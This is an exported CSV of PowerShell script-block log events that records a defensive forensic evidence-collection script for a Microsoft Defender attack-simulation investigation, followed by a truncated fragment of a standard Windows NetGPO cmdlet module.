"TimeCreated","Id","LevelDisplayName","Message"
"07-08-2025 18:35:46","4104","Warning","Creating Scriptblock text (3 of 3):

function Package-ForensicCollection {
    Update-Progress ""Creating Package""
    
    $packageName = ""ForensicPackage_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip""
    $packagePath = ""$env:TEMP\$packageName""
    
    Write-ForensicLog ""Creating forensic package: $packagePath"" ""INFO""
    Compress-Archive -Path $OutputPath -DestinationPath $packagePath -Force
    
    # Generate package hash
    $packageHash = Get-FileHash -Path $packagePath -Algorithm SHA256
    
    Write-Host ""`n????????????????????????????????????????????????????????????"" -ForegroundColor Green
    Write-Host ""?           FORENSIC COLLECTION COMPLETE                   ?"" -ForegroundColor Green
    Write-Host ""????????????????????????????????????????????????????????????"" -ForegroundColor Green
    Write-Host ""`nPackage created: $packagePath"" -ForegroundColor Yellow
    Write-Host ""Package size: $([Math]::Round((Get-Item $packagePath).Length / 1MB, 2)) MB"" -ForegroundColor Yellow
    Write-Host ""SHA256: $($packageHash.Hash)"" -ForegroundColor Cyan
    
    return $packagePath
}

# ============================================
# Main Execution
# ============================================
function Start-ForensicCollection {
    Write-Host ""`n"" -NoNewline
    Write-Host ""????????????????????????????????????????????????????????????"" -ForegroundColor Cyan
    Write-Host ""?    OPTIMIZED MDE FORENSIC COLLECTION v3.0               ?"" -ForegroundColor Cyan
    Write-Host ""?         Performance Enhanced Edition                     ?"" -ForegroundColor Cyan
    Write-Host ""????????????????????????????????????????????????????????????"" -ForegroundColor Cyan
    Write-Host ""`n""
    
    if ($QuickMode) {
        Write-Host ""Running in QUICK MODE - Limited collection for speed"" -ForegroundColor Yellow
    }
    
    Write-ForensicLog ""Starting optimized forensic collection"" ""INFO""
    Write-ForensicLog ""Output directory: $OutputPath"" ""INFO""
    
    try {
        # Execute all collection modules with progress tracking
        Collect-SystemInformation
        Collect-ProcessInformation
        Collect-RegistryArtifacts  # This is now optimized
        Collect-EventLogs
        Collect-FileSystemArtifacts
        Collect-MemoryDump
        Collect-WMIArtifacts
        Collect-ScheduledTasks
        Collect-Services
        Collect-NetworkArtifacts
        Collect-AttackArtifacts
        Generate-ForensicTimeline
        Generate-MDEReport
        
        # Package everything
        $package = Package-ForensicCollection
        
        Write-Progress -Activity ""Forensic Collection"" -Completed
        Write-ForensicLog ""Forensic collection completed successfully"" ""INFO""
        
    } catch {
        Write-ForensicLog ""Error during collection: $_"" ""ERROR""
        Write-Host ""Collection encountered an error: $_"" -ForegroundColor Red
    }
}

# Execute forensic collection
Start-ForensicCollection

ScriptBlock ID: 47ea1be4-afc2-4501-9321-d2f1cac09bf7
Path: C:\Simulation_Scripts\MDE_Forensic_Collector.ps1"
"07-08-2025 18:35:46","4104","Warning","Creating Scriptblock text (2 of 3):
          }
        }
    }
    
    if ($recentFiles.Count -gt 0) {
        $recentFiles | Export-Csv ""$fsPath\recent_temp_files.csv"" -NoTypeInformation
    }
    
    # Prefetch files
    Write-ForensicLog ""Collecting prefetch files"" ""ARTIFACT""
    $prefetchPath = ""$env:WINDIR\Prefetch""
    if (Test-Path $prefetchPath) {
        Get-ChildItem $prefetchPath -Filter ""*.pf"" -ErrorAction SilentlyContinue | 
            Select-Object -First 100 Name, Length, CreationTime, LastWriteTime, LastAccessTime |
            Export-Csv ""$fsPath\prefetch_files.csv"" -NoTypeInformation
    }
    
    if (-not $QuickMode) {
        # Recently modified executables (targeted search)
        Write-ForensicLog ""Finding recently modified executables"" ""ARTIFACT""
        $exePaths = @(""$env:LOCALAPPDATA"", ""$env:APPDATA"", ""$env:TEMP"")
        $suspiciousExe = @()
        
        foreach ($path in $exePaths) {
            if (Test-Path $path) {
                $exes = Get-ChildItem $path -Include ""*.exe"",""*.dll"",""*.ps1"",""*.bat"",""*.cmd"" -ErrorAction SilentlyContinue |
                        Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
                        Select-Object -First 50 FullName, Length, CreationTime, LastWriteTime
                
                if ($exes) {
                    $suspiciousExe += $exes
                }
            }
        }
        
        if ($suspiciousExe.Count -gt 0) {
            $suspiciousExe | Export-Csv ""$fsPath\recent_executables.csv"" -NoTypeInformation
        }
    }
}

# ============================================
# Memory Dump Collection (Optional)
# ============================================
function Collect-MemoryDump {
    if ($CollectMemory) {
        Update-Progress ""Collecting Memory Information""
        $memPath = ""$OutputPath\Memory""
        New-Item -Path $memPath -ItemType Directory -Force | Out-Null
        
        # Process memory samples
        Write-ForensicLog ""Collecting process memory samples"" ""MEMORY""
        $criticalProcesses = @(""lsass"", ""winlogon"", ""services"", ""svchost"", ""powershell"", ""cmd"")
        
        foreach ($procName in $criticalProcesses) {
            $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue | Select-Object -First 5
            foreach ($proc in $processes) {
                $memInfo = @{
                    ProcessName = $proc.Name
                    ProcessId = $proc.Id
                    WorkingSet = $proc.WorkingSet
                    VirtualMemory = $proc.VirtualMemorySize
                    PagedMemory = $proc.PagedMemorySize
                }
                $memInfo | ConvertTo-Json | Out-File ""$memPath\process_$($proc.Name)_$($proc.Id).json""
            }
        }
    }
}

# ============================================
# WMI Forensics
# ============================================
function Collect-WMIArtifacts {
    Update-Progress ""Collecting WMI Artifacts""
    $wmiPath = ""$OutputPath\WMI""
    New-Item -Path $wmiPath -ItemType Directory -Force | Out-Null
    
    Write-ForensicLog ""Checking for WMI persistence"" ""EVIDENCE""
    
    try {
        # WMI Event Filters
        $filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
        if ($filters) {
            $filters | Select-Object Name, Query, CreatorSID | 
                Export-Csv ""$wmiPath\wmi_event_filters.csv"" -NoTypeInformation
        }
        
        # WMI Event Consumers
        $consumers = Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue
        if ($consumers) {
            $consumers | Select-Object Name, CreatorSID | 
                Export-Csv ""$wmiPath\wmi_event_consumers.csv"" -NoTypeInformation
        }
        
        # WMI Bindings
        $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
        if ($bindings) {
            Write-ForensicLog ""WARNING: WMI persistence detected!"" ""CRITICAL""
            $bindings | Select-Object Filter, Consumer | 
                Export-Csv ""$wmiPath\wmi_bindings.csv"" -NoTypeInformation
        }
    } catch {
        Write-ForensicLog ""Could not enumerate WMI persistence"" ""INFO""
    }
}

# ============================================
# Scheduled Tasks Analysis (Optimized)
# ============================================
function Collect-ScheduledTasks {
    Update-Progress ""Collecting Scheduled Tasks""
    $taskPath = ""$OutputPath\ScheduledTasks""
    New-Item -Path $taskPath -ItemType Directory -Force | Out-Null
    
    Write-ForensicLog ""Enumerating scheduled tasks"" ""EVIDENCE""
    
    # Get all tasks but limit details collection
    $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Select-Object -First 500
    
    if ($tasks) {
        $tasks | Select-Object TaskName, TaskPath, State, Author, Date, LastRunTime, NextRunTime | 
            Export-Csv ""$taskPath\all_scheduled_tasks.csv"" -NoTypeInformation
        
        # Recently created tasks
        $recentTasks = $tasks | Where-Object { $_.Date -gt (Get-Date).AddDays(-30) }
        if ($recentTasks) {
            $recentTasks | Select-Object TaskName, Date, Author, TaskPath |
                Export-Csv ""$taskPath\recent_scheduled_tasks.csv"" -NoTypeInformation
        }
    }
}

# ============================================
# Services Analysis (Optimized)
# ============================================
function Collect-Services {
    Update-Progress ""Collecting Services""
    $svcPath = ""$OutputPath\Services""
    New-Item -Path $svcPath -ItemType Directory -Force | Out-Null
    
    Write-ForensicLog ""Enumerating Windows services"" ""EVIDENCE""
    
    # All services (basic info)
    Get-Service | Select-Object Name, DisplayName, Status, StartType |
        Export-Csv ""$svcPath\all_services.csv"" -NoTypeInformation
    
    # Non-Microsoft services
    Write-ForensicLog ""Identifying non-Microsoft services"" ""EVIDENCE""
    Get-WmiObject Win32_Service | 
        Where-Object { $_.PathName -notlike ""*\Windows\*"" -and $_.PathName -notlike ""*\Microsoft*"" } |
        Select-Object -First 100 Name, DisplayName, PathName, StartMode, State |
        Export-Csv ""$svcPath\non_microsoft_services.csv"" -NoTypeInformation
}

# ============================================
# Network Forensics (Optimized)
# ============================================
function Collect-NetworkArtifacts {
    Update-Progress ""Collecting Network Artifacts""
    $netPath = ""$OutputPath\Network""
    New-Item -Path $netPath -ItemType Directory -Force | Out-Null
    
    Write-ForensicLog ""Collecting network forensics"" ""EVIDENCE""
    
    # DNS cache (limited)
    Get-DnsClientCache | Select-Object -First 200 Name, Type, TimeToLive, Data |
        Export-Csv ""$netPath\dns_client_cache.csv"" -NoTypeInformation
    
    # Network adapters
    Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed |
        Export-Csv ""$netPath\network_adapters.csv"" -NoTypeInformation
    
    # Active connections (limited)
    $connections = Get-NetTCPConnection | Select-Object -First 200
    $connectionDetails = @()
    
    foreach ($conn in $connections) {
        try {
            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
            $connectionDetails += [PSCustomObject]@{
                LocalAddress = $conn.LocalAddress
                LocalPort = $conn.LocalPort
                RemoteAddress = $conn.RemoteAddress
                RemotePort = $conn.RemotePort
                State = $conn.State
                ProcessName = $proc.Name
                ProcessId = $conn.OwningProcess
            }
        } catch {}
    }
    
    if ($connectionDetails.Count -gt 0) {
        $connectionDetails | Export-Csv ""$netPath\tcp_connections_detailed.csv"" -NoTypeInformation
    }
}

# ============================================
# Attack Artifact Collection
# ============================================
function Collect-AttackArtifacts {
    Update-Progress ""Collecting Attack Artifacts""
    
    Write-ForensicLog ""Looking for attack artifacts"" ""CRITICAL""
    
    if (Test-Path $AttackArtifactPath) {
        Write-ForensicLog ""Found attack artifacts at: $AttackArtifactPath"" ""CRITICAL""
        
        # Copy attack artifacts
        $attackCopyPath = ""$OutputPath\AttackArtifacts""
        Copy-Item -Path $AttackArtifactPath -Destination $attackCopyPath -Recurse -Force
        
        # Parse IoCs if available
        $iocFiles = Get-ChildItem -Path $AttackArtifactPath -Filter ""*ioc*.json"" -ErrorAction SilentlyContinue
        
        foreach ($iocFile in $iocFiles) {
            try {
                $iocs = Get-Content $iocFile.FullName | ConvertFrom-Json
                Write-ForensicLog ""Loaded IoCs from: $($iocFile.Name)"" ""CRITICAL""
                
                # Quick IoC check
                $iocMatches = @()
                
                # Check DNS cache for domains
                if ($iocs.Domains) {
                    $dnsCache = Get-DnsClientCache
                    foreach ($domain in $iocs.Domains) {
                        if ($dnsCache | Where-Object { $_.Name -like ""*$domain*"" }) {
                            Write-ForensicLog ""ALERT: Malicious domain found: $domain"" ""CRITICAL""
                            $iocMatches += [PSCustomObject]@{
                                Type = ""Domain""
                                Indicator = $domain
                                Found = $true
                            }
                        }
                    }
                }
                
                if ($iocMatches.Count -gt 0) {
                    $iocMatches | Export-Csv ""$OutputPath\ioc_matches.csv"" -NoTypeInformation
                }
            } catch {
                Write-ForensicLog ""Error parsing IoC file: $($iocFile.Name)"" ""INFO""
            }
        }
    } else {
        Write-ForensicLog ""No attack artifacts found at: $AttackArtifactPath"" ""INFO""
    }
}

# ============================================
# Timeline Generation (Optimized)
# ============================================
function Generate-ForensicTimeline {
    if ($GenerateTimeline) {
        Update-Progress ""Generating Timeline""
        $timelinePath = ""$OutputPath\Timeline""
        New-Item -Path $timelinePath -ItemType Directory -Force | Out-Null
        
        Write-ForensicLog ""Generating forensic timeline"" ""INFO""
        
        $timelineEvents = @()
        
        # Recent file changes (limited scope)
        $recentFiles = Get-ChildItem $env:TEMP -File -ErrorAction SilentlyContinue | 
                      Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-24) } |
                      Select-Object -First 100
        
        foreach ($file in $recentFiles) {
            $timelineEvents += [PSCustomObject]@{
                Timestamp = $file.LastWriteTime
                Source = ""FileSystem""
                Event = ""File Modified""
                Details = $file.Name
            }
        }
        
        # Sort and export timeline
        if ($timelineEvents.Count -gt 0) {
            $timelineEvents | Sort-Object Timestamp | 
                Export-Csv ""$timelinePath\forensic_timeline.csv"" -NoTypeInformation
        }
    }
}

# ============================================
# MDE Integration Report
# ============================================
function Generate-MDEReport {
    Update-Progress ""Generating MDE Report""
    $mdePath = ""$OutputPath\MDE_Report""
    New-Item -Path $mdePath -ItemType Directory -Force | Out-Null
    
    Write-ForensicLog ""Generating MDE integration report"" ""INFO""
    
    # Check for indicators
    $suspiciousCount = 0
    
    # Check for MDE test artifacts
    $mdeTestTasks = Get-ScheduledTask | Where-Object { $_.TaskName -like ""*MDE*"" } | Measure-Object
    $suspiciousCount += $mdeTestTasks.Count
    
    $mdeTestReg = Test-Path ""HKCU:\Software\Classes\TestMDESimulation""
    if ($mdeTestReg) { $suspiciousCount++ }
    
    $mdeReport = @{
        CollectionInfo = @{
            Hostname = $env:COMPUTERNAME
            CollectionTime = $script:CollectionStartTime
            CollectionDuration = ((Get-Date) - $script:CollectionStartTime).TotalMinutes
            OutputPath = $OutputPath
            Mode = if ($QuickMode) { ""Quick"" } else { ""Full"" }
        }
        
        SuspiciousIndicators = $suspiciousCount
        
        RecommendedActions = @(
            ""Upload to security.microsoft.com for analysis"",
            ""Review collected artifacts for anomalies"",
            ""Check MDE portal for correlated alerts""
        )
    }
    
    $mdeReport | ConvertTo-Json -Depth 3 | Out-File ""$mdePath\mde_report.json""
    
    # Create summary
    $summary = @""
================================================================================
                    MDE FORENSIC COLLECTION SUMMARY
================================================================================
Hostname: $env:COMPUTERNAME
Collection Date: $(Get-Date -Format ""yyyy-MM-dd HH:mm:ss"")
Mode: $(if ($QuickMode) { ""Quick Mode"" } else { ""Full Collection"" })
Duration: $([Math]::Round(((Get-Date) - $script:CollectionStartTime).TotalMinutes, 2)) minutes
================================================================================

SUSPICIOUS INDICATORS FOUND: $suspiciousCount

ARTIFACTS COLLECTED:
- System Information: Complete
- Process Information: Complete
- Registry Artifacts: Complete (Optimized)
- Event Logs: Complete
- File System: Complete
- Network Connections: Complete
- Scheduled Tasks: Complete
- Services: Complete

OUTPUT LOCATION: $OutputPath

NEXT STEPS:
1. Review the collected artifacts
2. Upload to security.microsoft.com
3. Check MDE portal for alerts
4. Correlate with Attack ID if available

================================================================================
""@
    
    Write-Host $summary -ForegroundColor Cyan
    $summary | Out-File ""$mdePath\Summary.txt""
}

# ============================================
# Compression and Packaging
# ============================================

ScriptBlock ID: 47ea1be4-afc2-4501-9321-d2f1cac09bf7
Path: C:\Simulation_Scripts\MDE_Forensic_Collector.ps1"
"07-08-2025 18:35:46","4104","Warning","Creating Scriptblock text (1 of 3):
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Optimized Forensic Evidence Collection for MDE Attack Investigation
.DESCRIPTION
    Performance-optimized forensic artifact collection with progress tracking
    and timeout mechanisms to prevent hanging during collection.
.AUTHOR
    Forensic Investigation Team
.VERSION
    3.0 - Performance Optimized with Progress Tracking
#>

param(
    [string]$OutputPath = ""$env:TEMP\ForensicCollection_$(Get-Date -Format 'yyyyMMdd_HHmmss')"",
    [string]$AttackArtifactPath = ""$env:TEMP\MDEAdvancedTest_*"",
    [switch]$FullCollection = $true,
    [switch]$GenerateTimeline = $true,
    [switch]$CollectMemory = $false,
    [switch]$QuickMode = $false,
    [int]$MaxRegistryDepth = 2,
    [int]$TimeoutSeconds = 30
)

# Initialize forensic collection
New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null
$script:CollectionLog = ""$OutputPath\collection_log.txt""
$script:CollectionStartTime = Get-Date
$script:ProgressCounter = 0
$script:TotalSteps = 13

# Find the most recent attack artifact path if using wildcard
if ($AttackArtifactPath -like ""*`*"") {
    $foundPaths = Get-ChildItem -Path (Split-Path $AttackArtifactPath) -Filter (Split-Path $AttackArtifactPath -Leaf) -Directory -ErrorAction SilentlyContinue | 
                  Sort-Object LastWriteTime -Descending | 
                  Select-Object -First 1
    if ($foundPaths) {
        $AttackArtifactPath = $foundPaths.FullName
    }
}

function Write-ForensicLog {
    param($Message, $Type = ""INFO"")
    $timestamp = Get-Date -Format ""yyyy-MM-dd HH:mm:ss.fff""
    $logEntry = ""[$timestamp] [$Type] $Message""
    Add-Content -Path $script:CollectionLog -Value $logEntry
    
    switch($Type) {
        ""CRITICAL"" { Write-Host $logEntry -ForegroundColor Red }
        ""EVIDENCE"" { Write-Host $logEntry -ForegroundColor Green }
        ""ARTIFACT"" { Write-Host $logEntry -ForegroundColor Cyan }
        ""MEMORY"" { Write-Host $logEntry -ForegroundColor Magenta }
        ""PROGRESS"" { Write-Host $logEntry -ForegroundColor Yellow }
        default { Write-Host $logEntry }
    }
}

function Update-Progress {
    param([string]$Activity)
    $script:ProgressCounter++
    $percentComplete = [Math]::Round(($script:ProgressCounter / $script:TotalSteps) * 100)
    Write-Progress -Activity ""Forensic Collection"" -Status $Activity -PercentComplete $percentComplete
    Write-ForensicLog ""Progress: $Activity ($percentComplete%)"" ""PROGRESS""
}

# ============================================
# System Information Collection
# ============================================
function Collect-SystemInformation {
    Update-Progress ""Collecting System Information""
    $sysInfoPath = ""$OutputPath\SystemInfo""
    New-Item -Path $sysInfoPath -ItemType Directory -Force | Out-Null
    
    # Basic system info with timeout
    Write-ForensicLog ""Gathering basic system information"" ""ARTIFACT""
    
    $sysInfoJob = Start-Job -ScriptBlock {
        systeminfo.exe
    }
    
    $result = Wait-Job $sysInfoJob -Timeout 30
    if ($result) {
        Receive-Job $sysInfoJob | Out-File ""$sysInfoPath\systeminfo.txt""
    } else {
        Stop-Job $sysInfoJob
        ""System info collection timed out"" | Out-File ""$sysInfoPath\systeminfo.txt""
    }
    Remove-Job $sysInfoJob -Force
    
    # Computer details
    $computerInfo = @{
        ComputerName = $env:COMPUTERNAME
        Domain = $env:USERDOMAIN
        Username = $env:USERNAME
        OSVersion = [System.Environment]::OSVersion.VersionString
        Architecture = $env:PROCESSOR_ARCHITECTURE
        NumberOfProcessors = $env:NUMBER_OF_PROCESSORS
        SystemDrive = $env:SystemDrive
        TempPath = $env:TEMP
        CollectionTime = Get-Date -Format ""o""
    }
    $computerInfo | ConvertTo-Json | Out-File ""$sysInfoPath\computer_details.json""
    
    if (-not $QuickMode) {
        # Network configuration
        Write-ForensicLog ""Collecting network configuration"" ""ARTIFACT""
        ipconfig /all | Out-File ""$sysInfoPath\ipconfig.txt""
        netstat -an | Select-Object -First 1000 | Out-File ""$sysInfoPath\netstat.txt""
        arp -a | Out-File ""$sysInfoPath\arp_cache.txt""
        
        # DNS cache
        ipconfig /displaydns | Select-Object -First 500 | Out-File ""$sysInfoPath\dns_cache.txt""
    }
    
    # Firewall rules (limited)
    Write-ForensicLog ""Collecting firewall configuration"" ""ARTIFACT""
    Get-NetFirewallRule | Select-Object -First 100 Name, DisplayName, Enabled, Direction, Action | 
        Export-Csv ""$sysInfoPath\firewall_rules_sample.csv"" -NoTypeInformation
}

# ============================================
# Process and Memory Analysis (Optimized)
# ============================================
function Collect-ProcessInformation {
    Update-Progress ""Collecting Process Information""
    $procPath = ""$OutputPath\Processes""
    New-Item -Path $procPath -ItemType Directory -Force | Out-Null
    
    # Running processes with details
    Write-ForensicLog ""Enumerating running processes"" ""MEMORY""
    Get-Process | Select-Object Name, Id, StartTime, Path, Company, Description, 
        FileVersion, ProductVersion, CPU, WorkingSet, VirtualMemorySize -ErrorAction SilentlyContinue | 
        Export-Csv ""$procPath\running_processes.csv"" -NoTypeInformation
    
    # Process tree
    Get-CimInstance Win32_Process | Select-Object -First 500 Name, ProcessId, ParentProcessId, 
        CreationDate, CommandLine, ExecutablePath | 
        Export-Csv ""$procPath\process_tree.csv"" -NoTypeInformation
    
    if (-not $QuickMode) {
        # Network connections per process (limited)
        Write-ForensicLog ""Mapping network connections to processes"" ""MEMORY""
        Get-NetTCPConnection | Select-Object -First 200 LocalAddress, LocalPort, RemoteAddress, 
            RemotePort, State, OwningProcess, CreationTime | 
            Export-Csv ""$procPath\tcp_connections.csv"" -NoTypeInformation
    }
    
    # Suspicious handle count
    Write-ForensicLog ""Identifying suspicious handle counts"" ""MEMORY""
    Get-Process | Where-Object { $_.HandleCount -gt 5000 } | 
        Select-Object Name, Id, HandleCount | 
        Export-Csv ""$procPath\high_handle_processes.csv"" -NoTypeInformation
}

# ============================================
# Registry Forensics (OPTIMIZED - THIS IS THE FIX)
# ============================================
function Collect-RegistryArtifacts {
    Update-Progress ""Collecting Registry Artifacts""
    $regPath = ""$OutputPath\Registry""
    New-Item -Path $regPath -ItemType Directory -Force | Out-Null
    
    # Persistence locations (targeted, not recursive)
    Write-ForensicLog ""Checking registry persistence locations"" ""EVIDENCE""
    $persistenceKeys = @(
        ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"",
        ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"",
        ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"",
        ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"",
        ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"",
        ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"",
        ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders""
    )
    
    $registryPersistence = @()
    foreach ($key in $persistenceKeys) {
        if (Test-Path $key) {
            try {
                $values = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
                if ($values) {
                    # Convert to simple object to avoid serialization issues
                    $simpleValues = @{}
                    $values.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object {
                        $simpleValues[$_.Name] = $_.Value
                    }
                    
                    $registryPersistence += [PSCustomObject]@{
                        Key = $key
                        ValueCount = $simpleValues.Count
                        LastModified = (Get-Item $key -ErrorAction SilentlyContinue).LastWriteTime
                    }
                }
            } catch {
                Write-ForensicLog ""Error accessing key: $key"" ""INFO""
            }
        }
    }
    $registryPersistence | Export-Csv ""$regPath\persistence_registry.csv"" -NoTypeInformation
    
    # OPTIMIZED: Limited depth registry scan with specific targets
    Write-ForensicLog ""Performing targeted registry scan (optimized)"" ""EVIDENCE""
    
    # Only scan specific high-value paths with limited depth
    $targetPaths = @(
        ""HKCU:\Software\Microsoft\Windows\CurrentVersion"",
        ""HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion"",
        ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall""
    )
    
    $recentDate = (Get-Date).AddDays(-7)
    $recentKeys = @()
    $scanTimeout = [DateTime]::Now.AddSeconds($TimeoutSeconds)
    
    foreach ($targetPath in $targetPaths) {
        if ([DateTime]::Now -gt $scanTimeout) {
            Write-ForensicLog ""Registry scan timeout reached, moving on"" ""INFO""
            break
        }
        
        if (Test-Path $targetPath) {
            Write-ForensicLog ""Scanning: $targetPath"" ""INFO""
            
            # Non-recursive scan of immediate children only
            try {
                $keys = Get-ChildItem $targetPath -ErrorAction SilentlyContinue | 
                        Select-Object -First 100
                
                foreach ($key in $keys) {
                    if ($key.LastWriteTime -gt $recentDate) {
                        $recentKeys += [PSCustomObject]@{
                            Path = $key.PSPath
                            LastWriteTime = $key.LastWriteTime
                        }
                    }
                    
                    # Check one level deep if needed
                    if ($MaxRegistryDepth -gt 1) {
                        $subkeys = Get-ChildItem $key.PSPath -ErrorAction SilentlyContinue | 
                                  Select-Object -First 20
                        foreach ($subkey in $subkeys) {
                            if ($subkey.LastWriteTime -gt $recentDate) {
                                $recentKeys += [PSCustomObject]@{
                                    Path = $subkey.PSPath
                                    LastWriteTime = $subkey.LastWriteTime
                                }
                            }
                        }
                    }
                }
            } catch {
                Write-ForensicLog ""Error scanning $targetPath"" ""INFO""
            }
        }
    }
    
    if ($recentKeys.Count -gt 0) {
        $recentKeys | Select-Object -First 500 | 
            Export-Csv ""$regPath\recent_registry_changes.csv"" -NoTypeInformation
    }
    
    # Export specific registry hives
    Write-ForensicLog ""Exporting critical registry hives"" ""EVIDENCE""
    reg export ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" ""$regPath\HKCU_Run.reg"" /y 2>$null
    reg export ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" ""$regPath\HKLM_Run.reg"" /y 2>$null
}

# ============================================
# Event Log Analysis (Optimized)
# ============================================
function Collect-EventLogs {
    Update-Progress ""Collecting Event Logs""
    $evtPath = ""$OutputPath\EventLogs""
    New-Item -Path $evtPath -ItemType Directory -Force | Out-Null
    
    Write-ForensicLog ""Collecting Windows Event Logs"" ""CRITICAL""
    
    # Define time range for quick mode
    $timeRange = if ($QuickMode) { (Get-Date).AddHours(-6) } else { (Get-Date).AddHours(-24) }
    
    # Critical event logs with limited scope
    $eventLogs = @(
        @{Name=""Security""; IDs=@(4624,4625,4688,4689)},
        @{Name=""System""; IDs=@()},
        @{Name=""Application""; IDs=@()},
        @{Name=""Microsoft-Windows-PowerShell/Operational""; IDs=@(4104)},
        @{Name=""Microsoft-Windows-Windows Defender/Operational""; IDs=@()}
    )
    
    foreach ($log in $eventLogs) {
        Write-ForensicLog ""Processing $($log.Name) events"" ""CRITICAL""
        try {
            $filterHash = @{
                LogName = $log.Name
                StartTime = $timeRange
            }
            
            if ($log.IDs.Count -gt 0) {
                $filterHash.ID = $log.IDs
            }
            
            $events = Get-WinEvent -FilterHashtable $filterHash -MaxEvents 1000 -ErrorAction SilentlyContinue
            
            if ($events) {
                $events | Select-Object TimeCreated, Id, LevelDisplayName, Message | 
                    Export-Csv ""$evtPath\$($log.Name.Replace('/', '_'))_recent.csv"" -NoTypeInformation
            }
        } catch {
            Write-ForensicLog ""Could not access log: $($log.Name)"" ""INFO""
        }
    }
    
    # PowerShell script blocks (limited)
    Write-ForensicLog ""Collecting PowerShell script blocks"" ""CRITICAL""
    try {
        Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} -MaxEvents 100 -ErrorAction SilentlyContinue |
            Select-Object TimeCreated, Message | 
            Export-Csv ""$evtPath\powershell_scriptblocks.csv"" -NoTypeInformation
    } catch {}
}

# ============================================
# File System Forensics (Optimized)
# ============================================
function Collect-FileSystemArtifacts {
    Update-Progress ""Collecting File System Artifacts""
    $fsPath = ""$OutputPath\FileSystem""
    New-Item -Path $fsPath -ItemType Directory -Force | Out-Null
    
    # Recent files in temp directories (limited scope)
    Write-ForensicLog ""Collecting recent temporary files"" ""ARTIFACT""
    $tempPaths = @($env:TEMP, ""$env:LOCALAPPDATA\Temp"")
    $recentFiles = @()
    
    foreach ($tempPath in $tempPaths) {
        if (Test-Path $tempPath) {
            $files = Get-ChildItem $tempPath -File -ErrorAction SilentlyContinue |
                    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-3) } |
                    Select-Object -First 100 FullName, Length, CreationTime, LastWriteTime, LastAccessTime
            
            if ($files) {
                $recentFiles += $files
  

ScriptBlock ID: 47ea1be4-afc2-4501-9321-d2f1cac09bf7
Path: C:\Simulation_Scripts\MDE_Forensic_Collector.ps1"
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetGPO'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Open-NetGPO
{
    [CmdletBinding(PositionalBinding=$false)]
    
    [OutputType([System.String])]
    param(
    
    [Parameter(ParameterSetName='Open0', Mandatory=$true, Position=0)]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Open0')]
    [string]
    ${DomainController},

    [Parameter(ParameterSetName='Open0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Open0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Open0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
